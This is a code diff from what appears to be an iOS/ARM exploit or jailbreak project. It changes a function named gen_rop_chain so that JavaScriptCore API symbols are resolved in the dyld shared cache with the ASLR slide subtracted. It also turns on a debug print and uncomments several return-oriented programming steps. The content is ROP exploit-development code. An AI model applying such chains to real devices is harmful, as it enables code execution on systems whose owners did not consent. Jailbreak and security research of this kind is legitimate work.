@@ -230,6 +230,10 @@ uintptr_t get_dyld_shc_sym_addr(char* sym) {
 	return dlsym(RTLD_DEFAULT, sym) - get_dyld_shc_slide();
 }
 
+uintptr_t get_dyld_shc_sym_addr_jsc(char* sym) {
+	return dlsym(dlopen("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore", RTLD_LAZY) , sym) - get_dyld_shc_slide();
+}
+
 rop_chain_shit gen_rop_chain(uint32_t base,
 							 uint32_t we_out_here_addr,
 							 uint32_t mov_r0,
@@ -305,11 +309,11 @@ rop_chain_shit gen_rop_chain(uint32_t base,
 
 //	uint32_t slid_b0i = 0x2b14000;
 
-	uint32_t JSContextGroupCreate = get_dyld_shc_sym_addr("JSContextGroupCreate");
-	uint32_t JSGlobalContextCreateInGroup = get_dyld_shc_sym_addr("JSGlobalContextCreateInGroup");
-	uint32_t JSContextGetGlobalObject = get_dyld_shc_sym_addr("JSContextGetGlobalObject");
-	uint32_t JSStringCreateWithUTF8CString = get_dyld_shc_sym_addr("JSStringCreateWithUTF8CString");
-	uint32_t JSEvaluateScript = get_dyld_shc_sym_addr("JSEvaluateScript");
+	uint32_t JSContextGroupCreate = get_dyld_shc_sym_addr_jsc("JSContextGroupCreate");
+	uint32_t JSGlobalContextCreateInGroup = get_dyld_shc_sym_addr_jsc("JSGlobalContextCreateInGroup");
+	uint32_t JSContextGetGlobalObject = get_dyld_shc_sym_addr_jsc("JSContextGetGlobalObject");
+	uint32_t JSStringCreateWithUTF8CString = get_dyld_shc_sym_addr_jsc("JSStringCreateWithUTF8CString");
+	uint32_t JSEvaluateScript = get_dyld_shc_sym_addr_jsc("JSEvaluateScript");
 	uint32_t dlsym_ = get_dyld_shc_sym_addr("dlsym");
 
 	MOV_R0(dlsym_);
@@ -317,7 +321,7 @@ rop_chain_shit gen_rop_chain(uint32_t base,
 
 //	uint32_t settimeofday = get_dyld_shc_sym_addr("settimeofday");
 
-//	fprintf(stderr, "0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x\n", JSContextGroupCreate, JSGlobalContextCreateInGroup, JSContextGetGlobalObject, JSStringCreateWithUTF8CString, JSEvaluateScript, stime);
+	fprintf(stderr, "0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x\n", JSContextGroupCreate, JSGlobalContextCreateInGroup, JSContextGetGlobalObject, JSStringCreateWithUTF8CString, JSEvaluateScript, dlsym_);
 
 /*
 	MOV_R0(0);
@@ -384,9 +388,9 @@ rop_chain_shit gen_rop_chain(uint32_t base,
 	MOV_R1_R0();
 	PRINT_STILL_HERE();
 
-//	DEREF_IN_R0(0x144444);
-//	MOV_R1_R0();
-//	CALL_1ARG(base + printf_addr, base + dyld_shc_base_status);
+	DEREF_IN_R0(0x144444);
+	MOV_R1_R0();
+	CALL_1ARG(base + printf_addr, base + dyld_shc_base_status);
 
 //	CALL_1ARG(base + printf_addr, 0x109000);
 
